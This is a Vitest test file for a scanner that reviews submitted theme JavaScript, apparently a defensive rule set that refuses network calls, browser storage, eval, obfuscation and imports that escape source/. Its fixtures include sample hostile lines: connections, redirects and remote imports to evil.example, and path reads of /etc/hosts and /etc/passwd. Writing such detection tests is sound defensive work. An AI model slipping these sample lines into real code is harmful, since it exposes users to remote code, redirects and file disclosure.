// PRD-261 §9: the JS rules the isolated review runs on a submission's source/. Each refused
// pattern is found with its code and line; honest code that only looks close is not.
import { describe, expect, it } from "vitest";
import { excerptOf, fileFindings, jsRuleFindings, pathProblem, specifierProblem } from "../scripts/review/js-rules.ts";

const PATH = "source/entry.ts";

function codes(text: string): string[] {
  return fileFindings(PATH, text).map((finding) => finding.code);
}

describe("each refused pattern is found", () => {
  it.each([
    ["JS_FETCH", "await fetch('/api/agents')"],
    ["JS_XHR", "const xhr = new XMLHttpRequest()"],
    ["JS_WEBSOCKET", "new WebSocket('wss://evil.example')"],
    ["JS_EVENTSOURCE", "new EventSource('/stream')"],
    ["JS_SEND_BEACON", "navigator.sendBeacon('/x', data)"],
    ["JS_COOKIE", "const c = document.cookie"],
    ["JS_LOCAL_STORAGE", "localStorage.setItem('k', 'v')"],
    ["JS_SESSION_STORAGE", "sessionStorage.setItem('k', 'v')"],
    ["JS_INDEXED_DB", "const request = indexedDB.open('theme-db')"],
    ["JS_EVAL", "eval(code)"],
    ["JS_NEW_FUNCTION", "const f = new Function('a', 'return a')"],
    ["JS_POST_MESSAGE", "parent.postMessage(data, '*')"],
    ["JS_ELEMENT", "document.createElement('script')"],
    ["JS_ELEMENT", 'document.createElement("IFRAME")'],
    ["JS_ELEMENT", "return <iframe src={url} />"],
    ["JS_ELEMENT", "el.innerHTML = '<script>x()</script>'"],
    ["JS_SERVICE_WORKER", "navigator.serviceWorker.register('/sw.js')"],
    ["JS_WINDOW_OPEN", "window.open('https://evil.example')"],
    ["JS_LOCATION_WRITE", "window.location = 'https://evil.example'"],
    ["JS_LOCATION_WRITE", "location.href = next"],
    ["JS_LOCATION_WRITE", "document.location.assign(url)"],
    ["JS_COMPUTED_GLOBAL", "globalThis['fe' + 'tch']('/x')"],
    ["JS_COMPUTED_GLOBAL", "window[name]()"],
    ["JS_ALIAS_IMPORT", "import { Button } from '@/components/ui/button'"],
    ["JS_NEXT_IMPORT", "import Link from 'next/link'"],
    ["JS_IMPORT", "import { toast } from 'sonner'"],
    ["JS_IMPORT", "import { renderToString } from 'react-dom/server'"],
    ["JS_DYNAMIC_IMPORT", "await import('https://evil.example/x.js')"],
    ["JS_DYNAMIC_IMPORT", "await import(url)"],
    ["JS_DYNAMIC_IMPORT", "await import('lodash')"],
    ["JS_BUNDLED_REACT", "const internals = React.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE"],
    ["JS_BUNDLED_REACT", "const REACT_ELEMENT_TYPE = Symbol.for('react.element')"],
    ["JS_OBFUSCATED", "var _0x3f2a = ['x']"],
    ["JS_PATH_IMPORT", "import { secret } from '../outside.js'"],
    ["JS_PATH_IMPORT", "import config from '/kit/package.json'"],
    ["JS_PATH_IMPORT", "const raw = require('./parts/../../../etc/hosts')"],
    ["JS_PATH_IMPORT", "const load = (name) => import(`../${name}.ts`)"],
    ["JS_PATH_IMPORT", "const all = import.meta.glob(['./looks/*.ts', '../../**/*.ts'])"],
    ["JS_PATH_IMPORT", "const logo = new URL('../logo.svg', import.meta.url)"],
    ["JS_PATH_IMPORT", "const keys = new URL('file:///etc/passwd', import.meta.url)"],
  ])("%s: %s", (code, text) => {
    expect(codes(text)).toContain(code);
  });

  it("finds minified-only source by its line length", () => {
    expect(codes(`export const a = 1\n${"x=1;".repeat(400)}\n`)).toContain("JS_MINIFIED");
  });

  it("finds text hidden in escapes", () => {
    expect(codes(`const s = '${"\\x66".repeat(30)}'`)).toContain("JS_OBFUSCATED");
  });
});

describe("honest code that looks close is not refused", () => {
  const clean = [
    "import { jsx } from 'react/jsx-runtime'",
    "import { useState } from 'react'",
    "import { createRoot } from 'react-dom/client'",
    "import { defineTheme, useNavigate } from '@automatos/theme-sdk'",
    "import { Frame } from './frame.tsx'",
    "import styles from './frame.module.css'",
    "const Lazy = () => import('./lazy.ts')",
    "const sdk = () => import('@automatos/theme-sdk')",
    "const location = useLocation()",
    "if (location.hash === '#top' || location.pathname != '/') scrollTo(0, 0)",
    "const fetched = data.prefetch ? 1 : 0",
    "const evaluation = score.evaluate()",
    "dialog.open = true",
    "const value = Array.from('abc')",
    "const looks = import.meta.glob('./looks/*.json', { eager: true })",
    "const logo = new URL('./logo.svg', import.meta.url)",
    "const load = (name) => import(`./looks/${name}.ts`)",
  ].join("\n");

  it("has no findings", () => {
    expect(fileFindings(PATH, clean)).toEqual([]);
  });

  it("allows the import map's modules and refuses core-only ones", () => {
    expect(specifierProblem("react")).toBeNull();
    expect(specifierProblem("@automatos/theme-sdk")).toBeNull();
    expect(specifierProblem("./local.ts")).toBeNull();
    expect(specifierProblem("@/lib/utils")?.code).toBe("JS_ALIAS_IMPORT");
    expect(specifierProblem("next")?.code).toBe("JS_NEXT_IMPORT");
  });
});

describe("browser storage is refused, the SDK's storage area is not", () => {
  // The six names of the SDK's storage area (PRD-261 E3), used the way a theme uses them.
  const sdkStorage = [
    "import { readThemeState, writeThemeState, removeThemeState, subscribeThemeState, useThemeState, THEME_STATE_LIMITS } from '@automatos/theme-sdk'",
    "const options = { lifetime: 'session', within: 'workspace' } as const",
    "const read = readThemeState('hello-played', options)",
    "const written = writeThemeState('hello-played', true, options)",
    "const removed = removeThemeState('hello-played', options)",
    "const stop = subscribeThemeState('hello-played', () => undefined, options)",
    "const state = useThemeState('seen-deliverables', options)",
    "if (JSON.stringify(state.value).length > THEME_STATE_LIMITS.valueChars) state.remove()",
  ].join("\n");

  it("has no findings for the six SDK storage names", () => {
    expect(fileFindings(PATH, sdkStorage)).toEqual([]);
  });

  it.each([
    ["JS_LOCAL_STORAGE", "window.localStorage.getItem('k')"],
    ["JS_LOCAL_STORAGE", "globalThis.localStorage.clear()"],
    ["JS_SESSION_STORAGE", "self.sessionStorage.removeItem('k')"],
    ["JS_INDEXED_DB", "window.indexedDB.deleteDatabase('theme-db')"],
  ])("%s through a global: %s", (code, text) => {
    expect(codes(text)).toContain(code);
  });

  it("points each storage finding at the SDK's storage area", () => {
    const found = fileFindings(PATH, "localStorage\nsessionStorage\nindexedDB");
    expect(found.map((finding) => finding.code)).toEqual(["JS_LOCAL_STORAGE", "JS_SESSION_STORAGE", "JS_INDEXED_DB"]);
    for (const finding of found) expect(finding.message).toMatch(/SDK's storage area/);
  });
});

describe("paths stay inside source/", () => {
  it("allows relative paths that stay in source/, from any depth", () => {
    expect(pathProblem("../b.ts", "source/parts/a.ts")).toBeNull();
    expect(pathProblem("./index.ts?raw", "source/entry.ts")).toBeNull();
    expect(pathProblem(".", "source/entry.ts")).toBeNull();
    expect(pathProblem("react", "source/entry.ts")).toBeNull();
    expect(pathProblem("https://example.com/a.js", "source/entry.ts")).toBeNull();
  });

  it("refuses absolute paths and paths that leave source/", () => {
    expect(pathProblem("../../b.ts", "source/parts/a.ts")?.message).toMatch(/leaves source\//);
    expect(pathProblem("!../secret/*.ts", "source/entry.ts")?.message).toMatch(/leaves source\//);
    expect(pathProblem("C:\\kit\\x.ts", "source/entry.ts")?.message).toMatch(/absolute path/);
  });
});

describe("findings name the file and line", () => {
  it("reports the line and a plain excerpt", () => {
    const [finding] = fileFindings(PATH, "const a = 1\n\n  const r = await fetch(url)\t\n");
    expect(finding).toMatchObject({ code: "JS_FETCH", path: PATH, line: 3, excerpt: "const r = await fetch(url)" });
  });

  it("cuts long excerpts and drops control characters", () => {
    expect(excerptOf(`a\u0000b ${"y".repeat(300)}`)).toHaveLength(120);
    expect(excerptOf("a\u0000b")).toBe("a b");
  });

  it("reads only source/ scripts", () => {
    const text = new TextEncoder().encode("fetch('/x')");
    const files = new Map([
      ["source/a.ts", text],
      ["source/notes.md", text],
      ["dist/entry.js", text],
    ]);
    expect(jsRuleFindings(files).map((finding) => finding.path)).toEqual(["source/a.ts"]);
  });
});
